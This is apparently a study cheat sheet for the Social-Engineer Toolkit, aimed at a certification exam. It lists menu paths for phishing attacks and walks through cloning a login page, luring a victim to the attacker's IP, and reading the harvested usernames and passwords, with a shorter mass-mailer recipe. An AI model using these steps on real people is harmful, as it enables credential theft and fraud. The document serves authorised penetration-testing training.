# setoolkit — Social-Engineer Toolkit (SET)

> **The standard social-engineering tool.** CEH Practical routinely asks about credential harvesters and phishing page cloning.

**Launch (needs root):** `sudo setoolkit`

---

## 🎯 Menu path cheat-sheet

SET is menu-driven — memorise the **number path**:

| You want... | Path |
|---|---|
| **Credential Harvester (clone login page)** | `1 → 2 → 3 → 2` (Social-Engineering Attacks → Website Attack Vectors → Credential Harvester → Site Cloner) |
| Web Jacking | `1 → 2 → 6` |
| Tabnabbing | `1 → 2 → 4` |
| Metasploit browser exploit | `1 → 2 → 2` |
| **Mass Mailer** | `1 → 5` |
| Spear Phishing | `1 → 1` |
| **Infectious USB/CD/DVD** | `1 → 3` |
| Payload & Listener | `1 → 4` |
| Arduino-based attack | `1 → 6` |
| Wireless AP | `1 → 8` |
| QRCode generator | `1 → 9` |
| SMS spoofing | `1 → 7` |
| **Update SET** | `5` (from main menu) |

Main menu:
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
99) Exit
```

---

## 📋 Credential harvester walk-through (most asked)

```text
sudo setoolkit
1   # Social-Engineering Attacks
2   # Website Attack Vectors
3   # Credential Harvester Attack Method
2   # Site Cloner
<ENTER your attacker IP, e.g. 10.10.14.5>
<ENTER URL to clone, e.g. https://login.target.com>
```

SET now:
1. Clones the page into `/var/www/html/` (or its own listener).
2. Starts a listener on **port 80**.
3. Captured creds are printed to the terminal **and** saved to `/root/.set/reports/`.

Send the victim your IP; when they submit the form, you see:
```
POSSIBLE USERNAME FIELD FOUND: username=admin
POSSIBLE PASSWORD FIELD FOUND: password=P@ssw0rd
```

---

## 📋 Mass mailer

```text
sudo setoolkit
1 → 5
1   # single email address   (or 2 for mailing list)
<target@corp.com>
<attacker gmail / open SMTP>
<subject>, <body>
```

---

## 📋 Infectious USB / CD / DVD

```text
1 → 3
1   # File-Format Exploits  (or 2 for Standard Metasploit executable)
<LHOST>, <LPORT>, payload type
```
Output is dropped into `/root/.set/autorun/`.

---

## 🔑 Where stuff lives

| Item | Path |
|---|---|
| Reports (harvested creds) | `/root/.set/reports/` |
| Config | `/etc/setoolkit/set.config` |
| Cloned sites | `/root/.set/web_clone/` |

Toggle `APACHE_SERVER=ON` in config if you want the cloned site served by Apache on port 80 instead of SET's python listener.

---

## ⚠️ Gotchas

- **Must run as root** (port 80 listener).
- Question asks for the credentials captured? Look at terminal output *or* `cat /root/.set/reports/*.txt`.
- Clone fails with JavaScript-heavy sites — SET only grabs static HTML.
- **Legal** — only run against authorised targets; SET is very noisy.
- Port conflict: stop Apache first (`sudo systemctl stop apache2`) or set `APACHE_SERVER=ON`.

---

## 🔗 Related

- [msfvenom](msfvenom.md) · [metasploit](metasploit.md) · [responder](responder.md)
